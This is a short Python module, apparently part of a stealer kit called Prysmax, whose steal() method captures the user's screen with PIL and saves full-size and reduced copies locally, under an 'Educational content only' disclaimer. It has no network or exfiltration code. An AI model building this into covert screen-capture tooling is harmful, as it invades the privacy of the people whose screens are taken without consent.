#!/usr/bin/env python3
"""
Prysmax Screenshot Module
Educational content only
"""

import os
import sys
from datetime import datetime

try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

class ScreenshotCapture:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        
    def steal(self):
        """Capture screenshot"""
        try:
            screenshot_dir = os.path.join(self.output_dir, "Screenshots")
            os.makedirs(screenshot_dir, exist_ok=True)
            
            if PIL_AVAILABLE:
                # Capture screenshot
                screenshot = ImageGrab.grab()
                
                # Save screenshot
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"screenshot_{timestamp}.png"
                filepath = os.path.join(screenshot_dir, filename)
                
                screenshot.save(filepath, "PNG")
                print(f"[SCREENSHOT] Screenshot saved: {filename}")
                
                # Also save a smaller version
                small_screenshot = screenshot.resize((800, 600))
                small_filename = f"screenshot_small_{timestamp}.png"
                small_filepath = os.path.join(screenshot_dir, small_filename)
                small_screenshot.save(small_filepath, "PNG")
                
            else:
                # Fallback for systems without PIL
                print("[SCREENSHOT] PIL not available, skipping screenshot")
                
        except Exception as e:
            print(f"[SCREENSHOT] Error capturing screenshot: {e}")

